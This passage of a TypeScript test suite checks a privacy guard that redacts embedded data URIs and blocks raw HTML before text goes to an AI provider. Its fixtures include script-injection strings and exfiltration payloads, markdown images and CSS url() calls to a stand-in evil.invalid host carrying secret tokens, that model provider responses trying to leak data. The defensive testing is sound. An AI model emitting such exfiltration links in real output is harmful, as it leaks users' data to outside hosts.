  assert.equal(spans.length, PUBLIC_AI_MAX_REDACTED_SPANS);
  assert.equal(spans.at(-1)?.exact, false);
  assert.equal(spans.at(-1)?.end, many.length);
  assert.throws(
    () => collectPublicAiSensitiveDataSpans('x'.repeat(PUBLIC_AI_MAX_RAW_SOURCE_CODE_UNITS + 1)),
    /public_ai_raw_source_too_large/u,
  );
});

test('raw HTML classifier stays linear on comparison text and matched code spans', () => {
  const comparisonText = 'a < b and c > d\n'.repeat(Math.ceil((2 * 1024 * 1024) / 18));
  let startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(comparisonText, 'markdown'), false);
  assert.ok(performance.now() - startedAt < 1_500, '2 MiB comparison scan must remain below 1.5 seconds');
  const codeSpanText = '`<script>literal()</script>` '.repeat(Math.ceil((2 * 1024 * 1024) / 30));
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(codeSpanText, 'markdown'), false);
  assert.ok(performance.now() - startedAt < 1_500, '2 MiB code-span scan must remain below 1.5 seconds');

  const manyLinesWithTailBacktick = `${'plain text\n'.repeat(Math.ceil((2 * 1024 * 1024) / 11))}\``;
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(manyLinesWithTailBacktick, 'markdown'), false);
  assert.ok(
    performance.now() - startedAt < 1_500,
    '2 MiB of short lines with one tail backtick must remain below 1.5 seconds',
  );

  const manyFenceLines = '```js\nplain text\n```\n'.repeat(Math.ceil((2 * 1024 * 1024) / 21));
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(manyFenceLines, 'markdown'), false);
  assert.ok(
    performance.now() - startedAt < 1_500,
    '2 MiB of fenced-code lines must remain below 1.5 seconds',
  );

  const codeSpanCandidateUnit = '!<&amp;[]\\*\t\0';
  const codeSpanCandidateBudget = (2 * 1024 * 1024) - 2;
  const matchedCandidateCodeSpan = `\`${
    codeSpanCandidateUnit.repeat(Math.floor(codeSpanCandidateBudget / codeSpanCandidateUnit.length))
  }${codeSpanCandidateUnit.slice(0, codeSpanCandidateBudget % codeSpanCandidateUnit.length)}\``;
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(matchedCandidateCodeSpan, 'markdown'), false);
  assert.ok(
    performance.now() - startedAt < 1_500,
    '2 MiB matched code span candidates must remain inert below 1.5 seconds',
  );

  const tokenizerFloodPrefix = '~~~html\nplain\n~~~\n';
  const tokenizerFloods = [
    '*a',
    '&amp;',
    '\\*',
    '\n',
    '<a@b.c>',
    '!',
    '<a>',
    '>',
    '\t',
    '\0',
  ].map(unit => {
    const remaining = (2 * 1024 * 1024) - tokenizerFloodPrefix.length;
    return tokenizerFloodPrefix
      + unit.repeat(Math.floor(remaining / unit.length))
      + unit.slice(0, remaining % unit.length);
  });
  for (const source of tokenizerFloods) {
    startedAt = performance.now();
    assert.equal(hasPublicAiUnsafeHtmlSource(source, 'markdown'), true);
    assert.ok(
      performance.now() - startedAt < 1_500,
      '2 MiB tokenizer-candidate floods must fail closed below 1.5 seconds',
    );
  }
  const unmatchedCodeSpanFlood = `${tokenizerFloodPrefix}\`${'<a>'.repeat(
    Math.floor(((2 * 1024 * 1024) - tokenizerFloodPrefix.length - 1) / 3),
  )}`;
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(unmatchedCodeSpanFlood, 'markdown'), true);
  assert.ok(
    performance.now() - startedAt < 1_500,
    'unmatched code-span candidates must fail closed below 1.5 seconds',
  );
  const backtickFencePrefix = '```html\n';
  const backtickFenceSuffix = '\n```';
  const backtickFenceFlood = `${backtickFencePrefix}${'!'.repeat(
    (2 * 1024 * 1024) - backtickFencePrefix.length - backtickFenceSuffix.length,
  )}${backtickFenceSuffix}`;
  startedAt = performance.now();
  assert.equal(hasPublicAiUnsafeHtmlSource(backtickFenceFlood, 'markdown'), true);
  assert.ok(
    performance.now() - startedAt < 1_500,
    'backtick fence candidates must not bypass the tokenizer budget',
  );
});

test('raw HTML classifier decodes renderer-equivalent HTML fence info strings', () => {
  for (const source of [
    '```HTML\nplain\n```',
    '```ht&#x6d;l\nplain\n```',
    '```html&#45;preview\nplain\n```',
    '```htmlpreview\nplain\n```',
    '```html_preview\nplain\n```',
    '```html&#95;preview\nplain\n```',
    '```html&#32;js\nplain\n```',
    '```html!\nplain\n```',
    '```html.preview\nplain\n```',
    '```html/preview\nplain\n```',
    '```html-preview{foo}\nplain\n```',
    '```html_preview.meta\nplain\n```',
    '```html\\-preview\nplain\n```',
  ]) {
    assert.equal(hasPublicAiUnsafeHtmlSource(source, 'markdown'), true, source);
  }
  assert.equal(
    hasPublicAiUnsafeHtmlSource('```js\nconst label = "html";\n```', 'markdown'),
    false,
  );
  assert.equal(hasPublicAiUnsafeHtmlSource('```xhtml!\nplain\n```', 'markdown'), false);
});

test('raw HTML classifier follows CommonMark backtick closing rules around backslashes', async () => {
  const unsafeSources = [
    '` code \\` <script>alert(1)</script> `',
    '`` code \\`` <script>alert(2)</script> ``',
    '``` code \\``` <script>alert(3)</script> ```',
    '[)`\r\n`<script>alert(4)</script>> \t]```\t',
    'x`\r\n\\\\]`\t<script>alert(5)</script>',
  ];
  for (const source of unsafeSources) {
    const rendered = micromark(source, { allowDangerousHtml: true });
    assert.match(rendered, /<script>alert\(\d\)<\/script>/u, source);
    assert.equal(hasPublicAiUnsafeHtmlSource(source, 'markdown'), true, source);
  }

  const tailOpener = '\\`` <script>inert()</script> `';
  assert.doesNotMatch(micromark(tailOpener, { allowDangerousHtml: true }), /<script>/u);
  assert.equal(hasPublicAiUnsafeHtmlSource(tailOpener, 'markdown'), false);

  const slashes = (length: number) => '\\'.repeat(length);
  const ticks = (length: number) => '`'.repeat(length);
  const activeTag = '<script>fuzz()</script>';
  for (let openingSlashes = 0; openingSlashes < 4; openingSlashes += 1) {
    for (let openingTicks = 1; openingTicks <= 4; openingTicks += 1) {
      for (let middleSlashes = 0; middleSlashes < 4; middleSlashes += 1) {
        for (let middleTicks = 1; middleTicks <= 4; middleTicks += 1) {
          for (let trailingTicks = 1; trailingTicks <= 4; trailingTicks += 1) {
            const source = [
              `${slashes(openingSlashes)}${ticks(openingTicks)} code`,
              `${slashes(middleSlashes)}${ticks(middleTicks)}`,
              activeTag,
              ticks(trailingTicks),
            ].join(' ');
            if (micromark(source, { allowDangerousHtml: true }).includes(activeTag)) {
              assert.equal(hasPublicAiUnsafeHtmlSource(source, 'markdown'), true, source);
            }
          }
        }
      }
    }
  }

  let fetchCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'summary' } }] });
    },
  });
  for (const source of unsafeSources) {
    for (const action of ['generate', 'modify', 'summarize'] as const) {
      await assert.rejects(
        adapter.request(createSourceActionRequest(action, {
          range: { start: 0, end: 0 },
          source,
          sourceKind: 'markdown',
        })),
        (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
      );
    }
    await assert.rejects(
      adapter.request({ action: 'fix', source, sourceKind: 'markdown' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  assert.equal(fetchCount, 0);
  await adapter.request({ action: 'summarize', visibleText: 'Trusted visible text' });
  assert.equal(fetchCount, 1);
});

test('raw HTML classifier has no false negatives against seeded micromark differential cases', () => {
  let seed = 0x61c0ffee;
  const random = () => {
    seed = ((seed * 1_664_525) + 1_013_904_223) >>> 0;
    return seed;
  };
  const fragments = [
    '`', '``', '```', '````', '\\', '\\\\', '\n', '\r\n', '\t', ' ',
    '[', ']', '(', ')', '>', 'x', '~', '~~~', '```js\n', '\n```',
  ];
  const activeTag = '<script>seeded()</script>';
  let activeCases = 0;
  for (let caseIndex = 0; caseIndex < 10_000; caseIndex += 1) {
    let prefix = '';
    let suffix = '';
    const prefixLength = 1 + (random() % 8);
    const suffixLength = 1 + (random() % 8);
    for (let index = 0; index < prefixLength; index += 1) {
      prefix += fragments[random() % fragments.length];
    }
    for (let index = 0; index < suffixLength; index += 1) {
      suffix += fragments[random() % fragments.length];
    }
    const source = `${prefix}${activeTag}${suffix}`;
    if (!micromark(source, { allowDangerousHtml: true }).includes(activeTag)) continue;
    activeCases += 1;
    assert.equal(hasPublicAiUnsafeHtmlSource(source, 'markdown'), true, source);
  }
  assert.ok(activeCases > 1_000, `expected broad active coverage, got ${activeCases}`);
});

test('final adapter rejects source selections that touch data spans and ignores payload-only selectedText', async () => {
  const resource = 'data:text/plain;base64,QUJD)';
  const source = `SAFE ${resource} tail`;
  const resourceStart = source.indexOf('data:');
  let fetchCount = 0;
  let body = '';
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      fetchCount += 1;
      body = String(init?.body);
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });

  for (const action of ['generate', 'modify', 'summarize'] as const) {
    for (const range of [
      { start: resourceStart, end: resourceStart + 4 },
      { start: resourceStart + 8, end: resourceStart + 8 },
      { start: 0, end: resourceStart + resource.length },
    ]) {
      await assert.rejects(
        adapter.request(createSourceActionRequest(action, { source, sourceKind: 'text', range })),
        (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
      );
    }
  }
  await assert.rejects(
    adapter.request({ action: 'modify', selectedText: resource } as unknown as PublicAiRequest),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  assert.equal(fetchCount, 0);

  for (const range of [
    { start: 0, end: resourceStart },
    { start: resourceStart + resource.length, end: source.length },
    { start: resourceStart + resource.length, end: resourceStart + resource.length },
  ]) {
    await adapter.request({ action: 'modify', patchRange: range, source, sourceKind: 'text', range });
  }
  assert.equal(fetchCount, 3, 'ranges touching only a resource boundary remain safe');

  await adapter.request({
    action: 'modify',
    instruction: `rewrite ${resource}`,
    selectedText: resource,
    source,
    sourceKind: 'text',
    patchRange: { start: 0, end: 4 },
    range: { start: 0, end: 4 },
  });
  assert.equal(fetchCount, 4);
  assert.doesNotMatch(body, /data:text|QUJD/iu);
  assert.match(body, /Selected text:\\nSAFE/u);
});

test('final adapter validates independent selection and patch ranges before serialization', async () => {
  const resource = 'data:;base64,QUJD)';
  const source = `SAFE ${resource} tail`;
  const payloadStart = source.indexOf('QUJD');
  const safePatchRange = { start: 0, end: 4 };
  let requestCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => {
      requestCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'must not run' } }] });
    },
  });
  for (const range of [
    { start: source.indexOf('data:'), end: source.indexOf('data:') + resource.length },
    { start: payloadStart + 1, end: payloadStart + 2 },
    { start: payloadStart + 2, end: payloadStart + 2 },
  ]) {
    await assert.rejects(
      adapter.request({
        action: 'modify',
        patchRange: safePatchRange,
        range,
        source,
        sourceKind: 'text',
      }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({
      action: 'modify',
      range: safePatchRange,
      source,
      sourceKind: 'text',
    } as unknown as PublicAiRequest),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  assert.equal(requestCount, 0);
});

test('final adapter enforces the 24k selection limit on authoritative and patch ranges independently', async () => {
  const source = 'x'.repeat((PUBLIC_AI_MAX_SELECTION_CHARS * 2) + 2);
  const longRange = { start: 0, end: PUBLIC_AI_MAX_SELECTION_CHARS + 1 };
  const safeRange = {
    start: PUBLIC_AI_MAX_SELECTION_CHARS + 1,
    end: PUBLIC_AI_MAX_SELECTION_CHARS + 2,
  };
  let fetchCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'must not run' } }] });
    },
  });
  for (const request of [
    { action: 'modify' as const, patchRange: safeRange, range: longRange },
    { action: 'modify' as const, patchRange: longRange, range: safeRange },
  ]) {
    await assert.rejects(
      adapter.request({ ...request, source, sourceKind: 'text' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'input_too_large',
    );
  }
  assert.equal(fetchCount, 0);
});

test('final provider messages are rechecked after all encoded request fields are assembled', async () => {
  const encodedResource = String.raw`d&#97;t&bsol;61&colon;text&sol;plain&semi;base64&comma;QUJD&plus;&sol;&equals;&percnt;41)`;
  let messages: Array<{ content: string }> = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      messages = body.messages;
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  const source = `SAFE context ${encodedResource}`;
  await adapter.request({
    action: 'modify',
    diagnostic: `diagnostic ${encodedResource}`,
    instruction: `instruction ${encodedResource}`,
    patchRange: { start: 0, end: 4 },
    selectedText: encodedResource,
    source,
    sourceKind: 'text',
    range: { start: 0, end: 4 },
    visibleText: encodedResource,
  } as unknown as PublicAiRequest);

  assert.equal(messages.length, 2);
  assert.doesNotMatch(
    messages.map(message => message.content).join('\n'),
    /QUJD|base64|&(?:bsol|colon|sol|semi|comma|plus|equals|percnt);/iu,
  );
  assert.match(messages[1]?.content ?? '', /local image data omitted/u);
});

test('source-backed summarize derives its selection while visible-only summarize sends no source', async () => {
  const prompts: string[] = [];
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const request = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      prompts.push(request.messages[1]?.content ?? '');
      return jsonResponse({ choices: [{ message: { content: 'result' } }] });
    },
  });
  await adapter.request({
    action: 'summarize',
    selectedText: 'FORGED',
    source: 'SECRET-before SELECTED SECRET-after',
    sourceKind: 'text',
    range: { start: 14, end: 22 },
  });
  await adapter.request({ action: 'summarize', visibleText: 'VISIBLE ONLY' });
  await adapter.request({
    action: 'summarize',
    visibleText: 'VISIBLE data:text/plain;base64,QUJD) ONLY',
  });
  const rawHtml = '<script>SECRET_RUNTIME_SOURCE</script><p>Rendered HTML text</p>';
  await adapter.request({ action: 'summarize', visibleText: 'Rendered HTML text' });
  assert.equal(prompts[0], 'Selected text:\nSELECTED');
  assert.equal(prompts[1], 'Visible text:\nVISIBLE ONLY');
  assert.doesNotMatch(prompts[2], /data:text|QUJD/u);
  assert.equal(prompts[3], 'Visible text:\nRendered HTML text');
  assert.doesNotMatch(prompts.join('\n'), /FORGED|SECRET_RUNTIME_SOURCE/u);
  assert.ok(rawHtml.includes('SECRET_RUNTIME_SOURCE'));
});

test('fix round-trips immutable line carriers while allowing unrelated line repairs', async () => {
  const source = [
    'before\r\n',
    '![one](data:;base64,QUJD)\r\n',
    'middle\n',
    '![two](data:text/plain;base64,REVG)\n',
    'after',
  ].join('');
  let providerPrompt = '';
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      providerPrompt = body.messages[1]?.content ?? '';
      const tokenized = providerPrompt.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({
        choices: [{ message: { content: tokenized.replace('before', 'fixed').replace('middle', 'repaired') } }],
      });
    },
  });
  const result = await adapter.request({
    action: 'fix',
    diagnostic: 'repair data:application/octet-stream;base64,R0lBRw==)',
    source,
    sourceKind: 'text',
  });
  assert.equal(
    result.text,
    source.replace('before', 'fixed').replace('middle', 'repaired'),
  );
  assert.doesNotMatch(providerPrompt, /data:|QUJD|REVG|R0lBRw/iu);
  assert.match(providerPrompt, /Local resource preservation contract:/u);
  assert.match(providerPrompt, /only bytes on its logical line/u);
  assert.match(providerPrompt, /TESTNSPC0000_\r\n[\s\S]*TESTNSPC0001_\n/u);
});

test('fix restores a multiline resource by replacing every connected physical line as one carrier', async () => {
  const source = 'before\ndata:image/png;base64,QUJD\r\n\tREVG)\nafter';
  let providerSource = '';
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      providerSource = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: providerSource.replace('before', 'fixed') } }] });
    },
  });
  const result = await adapter.request({ action: 'fix', source, sourceKind: 'text' });
  assert.equal(result.text, source.replace('before', 'fixed'));
  assert.equal(providerSource, 'before\nTESTNSPC0000_\nafter');
  assert.doesNotMatch(providerSource, /data:image|QUJD|REVG/u);
});

test('fix merges adjacent sensitive physical lines into one immutable carrier', async () => {
  const source = [
    'before',
    'left data:;base64,QUJD)',
    'right data:text/plain;base64,REVG)',
    'after',
  ].join('\n');
  let providerSource = '';
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      providerSource = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: providerSource.replace('before', 'fixed') } }] });
    },
  });
  const result = await adapter.request({ action: 'fix', source, sourceKind: 'text' });
  assert.equal(providerSource, 'before\nTESTNSPC0000_\nafter');
  assert.equal(result.text, source.replace('before', 'fixed'));
});

test('fix rejects token protocol changes, structural wrappers and provider-injected resources', async () => {
  const source = 'before\n![one](data:;base64,QUJD)\nafter';
  let fetchCount = 0;
  const createAdapter = (transform: (tokenized: string, token: string) => string) => createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      fetchCount += 1;
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      const tokenized = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: transform(tokenized, 'TESTNSPC0000_') } }] });
    },
  });
  const transforms = [
    (tokenized: string, token: string) => tokenized.replace(`${token}\n`, ''),
    (tokenized: string, token: string) => tokenized.replace(token, `${token}\n${token}`),
    (tokenized: string, token: string) => tokenized.replace(token, `${token}_changed`),
    (tokenized: string, token: string) => tokenized.replace(token, ` ${token}`),
    (tokenized: string, token: string) => tokenized.replace(token, `${token} suffix`),
    (tokenized: string, token: string) => tokenized.replace(`\n${token}\n`, `\r\n${token}\r\n`),
    (tokenized: string) => `${tokenized}\ndata:text/plain;base64,QUJD)`,
    (_tokenized: string, token: string) => `<script>\n${token}\n</script>`,
    (_tokenized: string, token: string) => `![leak](https://evil.invalid/?q=\n${token}\n)`,
    (_tokenized: string, token: string) => `background: url(https://evil.invalid/?q=\n${token}\n)`,
    (_tokenized: string, token: string) => `![wrapped](\n${token}\n)`,
    (_tokenized: string, token: string) => `<img src="https://evil.invalid/?q=\n${token}\n">`,
  ];
  for (const transform of transforms) {
    await assert.rejects(
      createAdapter(transform).request({ action: 'fix', source, sourceKind: 'text' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_response',
    );
  }
  const ambiguous = createAdapter(tokenized => tokenized);
  await assert.rejects(
    ambiguous.request({
      action: 'fix',
      source: 'data:text/plain,ambiguous tail',
      sourceKind: 'text',
    }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  assert.equal(fetchCount, transforms.length, 'ambiguous fix input must fail before fetch');
});

test('fix requires first-line and final-line carrier tokens to occupy the complete logical line', async () => {
  const source = 'data:;base64,QUJD)';
  let fetchCount = 0;
  const createAdapter = (content: string) => createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content } }] });
    },
  });
  for (const content of [
    'prefixTESTNSPC0000_',
    'prefix\nTESTNSPC0000_',
    'TESTNSPC0000_suffix',
    'TESTNSPC0000_\nsuffix',
  ]) {
    await assert.rejects(
      createAdapter(content).request({ action: 'fix', source, sourceKind: 'text' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_response',
    );
  }
  assert.equal(fetchCount, 4);
});

test('fix rejects reordered immutable carriers', async () => {
  const source = [
    'before',
    'data:;base64,QUJD)',
    'middle',
    'data:text/plain;base64,REVG)',
    'after',
  ].join('\n');
  let fetchCount = 0;
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      fetchCount += 1;
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      const tokenized = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: tokenized
        .replace('TESTNSPC0000_', 'TEMP_TOKEN')
        .replace('TESTNSPC0001_', 'TESTNSPC0000_')
        .replace('TEMP_TOKEN', 'TESTNSPC0001_') } }] });
    },
  });
  await assert.rejects(
    adapter.request({ action: 'fix', source, sourceKind: 'text' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_response',
  );
  assert.equal(fetchCount, 1);
});

test('fix rejects a sensitive span nested in an external URL, CSS URL or quoted value before fetch', async () => {
  let fetchCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'must not run' } }] });
    },
  });
  for (const source of [
    '![x](https://evil.invalid/?q=data:;base64,QUJD)',
    'background:url(https://evil.invalid/?q=data:;base64,QUJD)',
    'src="https://evil.invalid/?q=data:;base64,QUJD)"',
    'https://evil.invalid/path,data:;base64,QUJD)',
    'https://evil.invalid/path;data:;base64,QUJD)',
    'https://evil.invalid/path(data:;base64,QUJD)',
    '![x](\ndata:;base64,QUJD\n)',
  ]) {
    await assert.rejects(
      adapter.request({ action: 'fix', source, sourceKind: 'text' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  assert.equal(fetchCount, 0);
});

test('fix rejects a restored result above the 16 MiB source cap', async () => {
  const prefix = 'data:;base64,';
  const source = `${prefix}${'A'.repeat(
    PUBLIC_AI_MAX_RAW_SOURCE_CODE_UNITS - prefix.length - 1,
  )})`;
  assert.equal(source.length, PUBLIC_AI_MAX_RAW_SOURCE_CODE_UNITS);
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      const tokenized = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: `${tokenized}X` } }] });
    },
  });
  await assert.rejects(
    adapter.request({ action: 'fix', source, sourceKind: 'text' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_response',
  );
});

test('fix namespace protocol stays linear and preserves 4096 ordered resources', async () => {
  const source = 'data:;base64,A)'.repeat(PUBLIC_AI_MAX_REDACTED_SPANS);
  const spans = collectPublicAiSensitiveDataSpans(source);
  assert.equal(spans.length, PUBLIC_AI_MAX_REDACTED_SPANS);
  assert.ok(spans.every(span => span.exact));
  let providerSource = '';
  const adapter = createPublicAiAdapter({
    createResourceNamespace: () => 'TESTNSPC',
    readConfig: () => configured(),
    fetch: async (_input, init) => {
      const body = JSON.parse(String(init?.body)) as { messages: Array<{ content: string }> };
      providerSource = body.messages[1]?.content.split('Full source to repair:\n')[1] ?? '';
      return jsonResponse({ choices: [{ message: { content: providerSource } }] });
    },
  });

  const startedAt = performance.now();
  const result = await adapter.request({ action: 'fix', source, sourceKind: 'text' });
  assert.ok(performance.now() - startedAt < 1_500, '4096-resource Fix must stay below 1.5 seconds');
  assert.equal(result.text, source);
  assert.equal(providerSource, 'TESTNSPC0000_');
  assert.doesNotMatch(providerSource, /data:;base64/u);
});

test('raw HTML source actions fail closed while visible-only summarize remains available', async () => {
  let fetchCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'summary' } }] });
    },
  });
  const html = '<!doctype html><script>const value = "da" + "ta:";</script>';
  for (const action of ['generate', 'modify', 'summarize'] as const) {
    await assert.rejects(
      adapter.request(createSourceActionRequest(action, {
        range: { start: 0, end: 0 },
        source: html,
        sourceKind: 'html',
      })),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({ action: 'fix', source: html, sourceKind: 'html' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  const rendererAliasFence = '```html-preview{provider-bypass}\n<script>run()</script>\n```';
  for (const action of ['generate', 'modify', 'summarize'] as const) {
    await assert.rejects(
      adapter.request(createSourceActionRequest(action, {
        range: { start: 0, end: 0 },
        source: rendererAliasFence,
        sourceKind: 'markdown',
      })),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({ action: 'fix', source: rendererAliasFence, sourceKind: 'markdown' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  for (const unsafeSource of [
    '<!-- leading note -->\n<!doctype html><script>run()</script>',
    '<!--><script>run()</script>',
    '<?bogus?><script>run()</script>',
    '# Markdown preface\n```html\n<script>run()</script>\n```',
  ]) {
    await assert.rejects(
      adapter.request({ action: 'fix', source: unsafeSource, sourceKind: 'html' }),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({
      action: 'modify',
      patchRange: { start: 0, end: 0 },
      range: { start: 0, end: 0 },
      source: '<script>run()</script>',
      sourceKind: 'text',
    }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  await assert.rejects(
    adapter.request({
      action: 'modify',
      range: { start: 0, end: 0 },
      source: 'plain text',
    } as unknown as PublicAiRequest),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  const mixedRaw = '# Markdown preface\n<script>const u = "da" + "ta:"; const secret = "RUNTIME_SECRET";</script>\nSAFE';
  const mixedRawSafeStart = mixedRaw.lastIndexOf('SAFE');
  for (const action of ['generate', 'modify', 'summarize'] as const) {
    await assert.rejects(
      adapter.request(createSourceActionRequest(action, {
        range: { start: mixedRawSafeStart, end: mixedRaw.length },
        source: mixedRaw,
        sourceKind: 'text',
      })),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({ action: 'fix', source: mixedRaw, sourceKind: 'text' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  const mixed = '# Safe\n\n```html\n<script>run()</script>\n```\n\nSAFE_SELECTION';
  const htmlRangeStart = mixed.indexOf('<script>');
  await assert.rejects(
    adapter.request({
      action: 'summarize',
      range: { start: htmlRangeStart, end: htmlRangeStart + 8 },
      source: mixed,
      sourceKind: 'text',
    }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  const safeRangeStart = mixed.indexOf('SAFE_SELECTION');
  for (const action of ['generate', 'modify', 'summarize'] as const) {
    await assert.rejects(
      adapter.request(createSourceActionRequest(action, {
        range: { start: safeRangeStart, end: safeRangeStart + 'SAFE_SELECTION'.length },
        source: mixed,
        sourceKind: 'text',
      })),
      (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
    );
  }
  await assert.rejects(
    adapter.request({ action: 'fix', source: mixed, sourceKind: 'text' }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  await adapter.request({ action: 'summarize', visibleText: 'Visible HTML text' });
  assert.equal(fetchCount, 1);
});

test('unsafe privacy input wins over missing configuration without opening settings or fetching', async () => {
  const resource = 'data:application/octet-stream;base64,QUJD)';
  let configReads = 0;
  let fetchCount = 0;
  let openCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => {
      configReads += 1;
      return configured({ apiKey: '' });
    },
    onMissingConfig: () => { openCount += 1; },
    fetch: async () => {
      fetchCount += 1;
      return jsonResponse({ choices: [{ message: { content: 'must not run' } }] });
    },
  });
  await assert.rejects(
    adapter.request({
      action: 'summarize',
      range: { start: 6, end: 10 },
      source: `SAFE ${resource}`,
      sourceKind: 'text',
    }),
    (error: unknown) => error instanceof PublicAiError && error.code === 'privacy_unsafe_input',
  );
  for (const unsafeRequest of [
    {
      action: 'summarize',
      visibleText: ' '.repeat(PUBLIC_AI_MAX_SELECTION_CHARS + 1),
    },
    {
      action: 'generate',
      instruction: ' '.repeat(PUBLIC_AI_MAX_INSTRUCTION_CHARS + 1),
      range: { start: 0, end: 0 },
      source: '',
      sourceKind: 'text',
    },
    {
      action: 'unknown',
      range: { start: 0, end: 0 },
      source: '',
      sourceKind: 'text',
    },
  ]) {
    await assert.rejects(
      adapter.request(unsafeRequest as unknown as PublicAiRequest),
      (error: unknown) => error instanceof PublicAiError
        && (error.code === 'input_too_large' || error.code === 'privacy_unsafe_input'),
    );
  }
  assert.deepEqual({ configReads, fetchCount, openCount }, { configReads: 0, fetchCount: 0, openCount: 0 });
});

test('missing config opens settings and reports a typed error', async () => {
  let openCount = 0;
  const adapter = createPublicAiAdapter({
    readConfig: () => configured({ apiKey: '' }),
    onMissingConfig: () => { openCount += 1; },
    fetch: async () => assert.fail('fetch must not run'),
  });
  await assert.rejects(adapter.request({
    action: 'generate',
    range: { start: 0, end: 0 },
    source: '',
    sourceKind: 'text',
  }), (error: unknown) => (
    error instanceof PublicAiError && error.code === 'missing_config'
  ));
